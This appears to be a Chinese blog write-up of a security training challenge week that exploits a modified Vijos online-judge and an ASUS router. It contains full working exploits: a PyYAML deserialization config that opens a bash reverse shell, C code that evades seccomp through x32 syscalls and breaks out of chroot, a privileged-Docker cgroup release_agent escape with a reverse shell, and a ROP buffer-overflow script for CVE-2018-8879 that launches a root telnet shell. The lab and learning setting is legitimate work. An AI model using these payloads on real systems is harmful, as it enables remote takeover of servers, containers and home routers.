---
title: Tencent Spark Program 2021
date: 2021-08-19 10:38:00
tags: Spark Program
category: Writeup
---

引言：如今，几乎所有的智能产品或多或少都离不开计算机的发展，计算机安全也渗入进生活的方方面面，大到网站Web服务器，小到手机App和家用路由器。挑战周的挑战项目由Web安全开始，逐渐向二进制安全，逆向安全推进。

![20a77740fa52aabce522ac90e71e886](assets/20a77740fa52aabce522ac90e71e886.jpg)

声明：挑战周内使用的Web组件和评测机组件均来自开源OJ (Online Judge)组件：[Vijos/vj4](https://github.com/vijos/vj4), [Vijos/jd4](https://github.com/vijos/jd4)。原组件经过多次迭代没有漏洞产生，导师通过修改jd4的源代码暴露漏洞供挑战周使用。漏洞复现所使用的安卓Chrome漏洞和路由器固件漏洞 ([CVE-2018-8879](https://nvd.nist.gov/vuln/detail/CVE-2018-8879)) 厂商均已修复，请及时更新App或固件。

如对文档有任何疑问，请联系E-mail：ThomasonZhao@qq.com

## Vijos OJ评测机之yaml反序列化

挑战背景：VIJOS是一个安全的OJ系统。这可能主要得益于开发者也是CTF选手。

![img](assets/clip_image002.jpg)

不过，并不是所有OJ的开发者都了解安全技术。本题目使用的VIJOS就是一个不懂安全的开发者开发的，他在开发过程中犯了一个很小安全错误，然而，这个安全错误却导致OJ被完全攻陷，你能找到这个安全错误，并利用它攻陷OJ吗？

代码审计：使用 `git stutus` 和 `git diff` 查看相关代码更改，发现只更改了一行代码，从使用 `safe_load()` 函数更改为 `load()`。

>   `yaml.load` accepts a byte string, a Unicode string, an open binary file object, or an open text file object. A byte string or a file must be encoded with *utf-8*, *utf-16-be* or *utf-16-le* encoding. `yaml.load` detects the encoding by checking the *BOM* (byte order mark) sequence at the beginning of the string/file. If no *BOM* is present, the *utf-8* encoding is assumed.
>
>   `yaml.load` returns a Python object.
>
>   Note that the ability to construct an arbitrary Python object may be dangerous if you receive a YAML document from an untrusted source such as the Internet. The function `yaml.safe_load` limits this ability to simple Python objects like integers or lists.

![image-20210813141927044](assets/image-20210813141927044.png)

漏洞详情：此处产生的是Pyyaml反序列化漏洞 ([CVE-2019-20477](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/#:~:text=%5BCVE-2019-20477%5D-%200Day%20YAML%20Deserialization%20Attack%20on%20PyYAML%20version,...%206%20YAML%20Deserialization%207%20YAML%20Deserialization.%20)) 。根据反序列化原理编写payload，追加到作为测试数据的文件压缩包内。

```python
import yaml
import os


class Payload(object):
    def __reduce__(self):
        return (os.system,('ls',))


serialized_data = yaml.dump(Payload())  # serializing data

print(serialized_data)
---------------------------------------
!!python/object/apply:nt.system [ls]
```

`config.yaml` payload文件：

```yaml
default: &default
  time: 1s
  memory: 32m
  score: 10
cases:
- <<: *default
  input: case0.in
  output: case0.out
- <<: *default
  input: case1.in
  output: case1.out
- <<: *default
  input: case2.in
  output: case2.out
- <<: *default
  input: case3.in
  output: case3.out
- <<: *default
  input: case4.in
  output: case4.out
- <<: *default
  input: case5.in
  output: case5.out
- <<: *default
  input: case6.in
  output: case6.out
- <<: *default
  input: case7.in
  output: case7.out
- <<: *default
  input: case8.in
  output: case8.out
- <<: *default
  input: case9.in
  output: case9.out

m: !!python/object/new:os.system ["/bin/bash -c '/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1'"]
```

通过在Vijos账号中创建自己的域并创建自己的题目，上传修改yaml文件后的测试文件压缩包，随意运行程序即可反弹Shell。拿到Docker下的root权限。

![image-20210813144701111](assets/image-20210813144701111.png)



## Vijos OJ评测机之沙箱逃逸

题目背景：经过上次的Vijos逃逸事件之后，不懂安全的开发者修补了上次漏洞。并痛定思痛决定开始学习安全技术。在学习了安全技术之后，他认为VIJOS的沙箱允许选手在提交的代码中执行任意的系统调用是非常危险的行为，所以他决定对其进行限制，然而，在这个过程中，他又犯了一些错误，这些错误可以导致评测机被攻陷，你能找到这些错误，并利用它们攻陷评测机吗？

代码审计：同样的，使用 `git stutus` 和 `git diff` 查看相关代码更改。（不过开发者好像并没有修复第一个漏洞嘿嘿）主要更改就是重写了原有的沙箱机制，使用 `chroot `和 `LD_PRELOAD `指定 `scf.so` 文件制定沙箱

![image-20210819123040774](assets/image-20210819123040774.png)

漏洞详情：评测机使用的沙箱依然是建立在docker容器中，在 `/tmp` 目录下创建沙箱使用的文件夹，并使用 `chroot` 使每一个沙箱都具有和评测机容器内一样的环境（只不过是假的root）。新引用的 `scf.so` 文件重写了所提交代码的 `main` 函数，通过 `LD_PRELOAD` 强行绑定 `seccomp` 组件限制程序使用不当的系统调用（syscall），例如直接写入文档或者执行恶意代码。

>   A **chroot** on Unix operating systems is an operation that changes the apparent root directory for the current running process and its children. A program that is run in such a modified environment cannot name (and therefore normally cannot access) files outside the designated directory tree. The term "chroot" may refer to the chroot(2) system call or the chroot(8) wrapper program. The modified environment is called a chroot jail.
>
>   **seccomp** (short for **secure computing mode**) is a computer security facility in the Linux kernel. seccomp allows a process to make a one-way transition into a "secure" state where it cannot make any system call except `exit()`, `sigreturn()`, `read()` and `write()` to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS。 In this sense, it does not virtualize the system's resources but isolates the process from them entirely.

![image-20210819133532124](assets/image-20210819133532124.png)

通过IDA逆向所引用的 `scf.so` 文件，其只禁用了x86和x64下的系统调用，并未检查 x32 ABI的系统调用，因此使用x32的系统调用即可绕过 `sccomp` 的检测。因此，所有参数传参（例如所执行的命令，变量等），地址都需要手动指定为32位地址。

>   x32 is a new ABI being actively worked on. It is basically 32-bit code running in x86_64 (x64) mode on the CPU so that it has access to the additional 8 registers to boost program speed while remaining memory efficient via the use of 32-bit pointers. See [sites.google.com/site/x32abi](https://sites.google.com/site/x32abi/) and [lwn.net/Articles/456731](http://lwn.net/Articles/456731/). – [gps](https://stackoverflow.com/users/1163142/gps)

![image-20210819124847550](assets/image-20210819124847550.png)

![image-20210819124754861](assets/image-20210819124754861.png)

逃逸 `chroot` 则相对来讲比较简单，在沙箱内得到RCE (Remote Code Execution) 权限后，向当前沙箱根目录下创建任意临时文件夹 `abc`，进入此文件夹下执行 `chroot` 命令，此时 `abc` 文件夹变成了根目录。然后多次执行更改当前工作目录为上级文件夹直到到达真正的根目录。此时再次执行 `chroot` 命令，则当前目录为容器根目录。

>   *    Create a temporary directory in its current working directory
>
>   *    Open the current working directory
>
>        ​	Note: only required if chroot() changes the calling program's working directory.
>
>   *    Change the root directory of the process to the temporary directory using chroot().
>
>   *    Use fchdir() with the file descriptor of the opened directory to move the current working directory outside the chroot()ed area.
>
>        ​	Note: only required if chroot() changes the calling program's working directory.
>
>   *	Perform chdir("..") calls many times to move the current working directory into the real root directory.
>   *	Change the root directory of the process to the current working directory, the real root directory, using chroot(".")

则最终攻击思路为：先绕过 `sccomp` 并跳出 `chroot` 在容器中通过执行任意代码删除所引用的 `/lib64/scf.so` 文件解除 `seccomp` 的syscall限制，再次上传第二段代码直接执行反弹shell指令，拿到容器shell。

EXP文件如下：

```c
// first time code
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <unistd.h>
#include<sys/mman.h>
#include<string.h>

void change_root(void)
{
  chdir("/");
  mkdir("abc", 0755);
  syscall((unsigned int)1073741985, (unsigned long)"abc"); // chroot
  for(int i=0;i<20;++i)chdir("..");
  syscall((unsigned int)1073741985, (unsigned long)".");
}

int main(){
        printf("chroot\n");
        // syscall((unsigned)1073741985, (unsigned)".foo");
        change_root();
        printf("success\n");
        size_t pagesize=getpagesize();
        void *region = mmap((void*)0,pagesize,PROT_READ|PROT_WRITE|PROT_EXEC,32|MAP_PRIVATE|64,0,0);
        const char comm[]= "/bin/rm\0-rf\0/lib64/scf.so";
        memcpy(region, comm, sizeof comm);
        const unsigned ptr[] = {region, region+8, region+12, NULL};
        memcpy(region + 64, ptr, sizeof ptr);
        const unsigned* ptr1 = region + 64;
        syscall((unsigned int)1073742344, (unsigned long)ptr1[0], (unsigned long)ptr1, 0); // execve
        return 0;
}


---------------------------------------------
// second time code


#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <unistd.h>
#include<sys/mman.h>
#include<string.h>

void change_root(void)
{
  chdir("/");
  mkdir("abc", 0755);
  syscall((unsigned int)1073741985, (unsigned long)"abc"); // chroot
  for(int i=0;i<20;++i)chdir("..");
  syscall((unsigned int)1073741985, (unsigned long)".");
}
 
int main()
{
  change_root();
    printf("Running ps with system\n");
    system("/bin/bash -c \"/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1\"");
    printf("ps Done\n");
    return 0;
}
```

在提交窗口依次运行payload代码即可获取反弹shell。ps：可能由于demo中对于代码执行时间有所限制，直接利用EXP可能会造成反弹shell时间非常短（只有不到1s），可以通过自定义题目代码执行时间等等方法去绕过，这里不过多赘述。

![image-20210819130843286](assets/image-20210819130843286.png)

## Docker逃逸

挑战背景：即使我们通过前两个挑战得到了反弹shell，但是通过观察主机名我们可以发现实际上这个shell是docker内部的。我们还需要逃逸出docker才能得到主机的shell。

漏洞分析：因为评测机需要进行一些Linux内核的cgroup优化评测过程（例如直接限制运行时间和内存），因此允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限。所以攻击思路为：利用mount命令在Linux系统盘下挂载一个新建的文件夹使容器内可以直接访问主机文件，创建 `release_agent` 文件并通过创建子cgroup得以快速杀死cgroup内所有进程并触发 `release_agent` ，把攻击代码写入 `release_agent` 文件内即可。

>   使用特权模式启动容器后（docker run --privileged），Docker容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限、并可以执行mount命令进行挂载。
>
>   当控制使用特权模式的容器时，Docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。

>   cgroups(Control Groups) 是 linux 内核提供的一种机制，**这种机制可以根据需求把一系列系统任务及其子任务整合(或分隔)到按资源划分等级的不同组内，从而为系统资源管理提供一个统一的框架**。简单说，cgroups 可以限制、记录任务组所使用的物理资源。本质上来说，cgroups 是内核附加在程序上的一系列钩子(hook)，通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的。

`payload.sh` EXP文件：

```bash
#！/bin/bash
mkdir -p /mnt/hola
mount /dev/vda2 /mnt/hola

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/[ip]/[port] 0>&1" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

反弹shell：

![image-20210813182738384](assets/image-20210813182738384.png)

## 安卓Chrome漏洞导致文件泄露

暂未完成任务

## 路由器未授权用户Getshell

挑战背景：导师怕我们题目做的太快作为补充题目（bushi。路由器作为家庭网络的中枢，在网络安全中有至关重要的作用。若路由器被攻击者侵入，家庭网络上的所有流量都将暴露给攻击者。懒惰的开发者家里现在使用了一个旧版本固件的路由器，已知暴露在[CVE-2018-8879缓冲区溢出漏洞](https://nvd.nist.gov/vuln/detail/CVE-2018-8879)的风险下，你能试着拿到他的高端路由器吗？（物理意义上以及安全意义上）

漏洞分析：根据文章，通过遍历web-server中所有文件查看是否能够找到未授权即可访问的页面，发现在 `blocking.asp` 页面中显示的信息都是通过URL参数传参得到的，`mac`，`flag` 和 `cat_id`。当通过往参数塞大量A时，通过系统日志，HTTPd 保护进程崩溃了。至此判断为非常经典的缓冲区溢出漏洞。但是只通过这个方式没有办法监听栈地址；并且无法跳转到shell code中；没有ROP chain，因为需要 `null-byte` 。（注意，目前为止的利用仅仅在URL参数中）通过查看栈内其他数据，发现在 HTTP 请求头中每个参数的结尾处有 `null-byte` 的存在，可以作为ROP chain使用。

>   ROP (Return Oriented Programming) is related to buffer overflows, in that it requires a buffer to overflow. The difference is that ROP is used to bypass certain protection measures that prevent normal buffer overflows. It turns out that a lot of the time, memory in programs is marked as non-executable. This means that we can't just put shellcode on the stack and have it execute, this is where ROP comes in. **Recall the stack.** 
>
>   ```
>   [ return address ] <-- this is the address of the next function to call, we want to overwrite this
>   [  eip (address) ] <-- this takes up memory
>   [ stack variable ] <-- this also takes up memory
>   [    buffer[15]  ] <-- this is the 16th character of our input string
>   [      ...       ]
>   [    buffer[0]   ] <-- our input starts here
>   ```

路由器为ARM架构，因此需提前了解ARM寄存器和其函数调用约定。

>   先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 **r0 ～ r3** 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 **r0** 中
>
>   除此之外，arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标

![img](assets/ARM_Calling_Convention.png)

需要执行恶意代码，首先我们需要控制的就是PC或b/bl，能够有机会让我们控制的地方我们称之为 `gadget` 。寻找 gadget 的方式有很多，比如利用ROPgadget，ropper，甚至直接IDA逆向后搜索关键词。找到了合适的gadget，通过栈溢出，我们把URL参数flag溢出到存放请求头参数的区域，再通过请求头中参数使PC的地址成为任意我们所控制的地址。下一步便是寻找和系统调用相关的程序地址，比如system函数。把PC地址指向system函数的地址，再传参恶意代码，整个攻击过程就结束啦。

`payload.py` EXP文件：

```python
#!/usr/bin/python2
import struct, urllib3
# 00019360 add sp, sp #0x800 pop {r4-r7,PC}
# 0002B3B4 mov r0, sp; mov r5, sp; bl system
cmd = 'telnetd -p 8888 -b 0.0.0.0:8888 -l /bin/sh'
cmd = ';' + cmd + ';'
align = "A" * 208
payload = "A" * 532
payload += struct.pack("<I", 0x00019360)
url = "http://192.168.50.1/blocking.asp"
params = {'flag': payload}
headers = {'Accept':('text/html,application/xhtml+xml,application/xml;''q=0.9,image/webp,*/*;q=0.8'),
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': align + "VVVV" + "WWWW" + "XXXX" + "YYYY" + struct.pack("<I", 0x0002B3B4),
        'User-Agent': cmd + 'clickedItem_tab=0',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'}
http = urllib3.PoolManager()
r = http.request('GET', url, fields=params,headers=headers,)
```

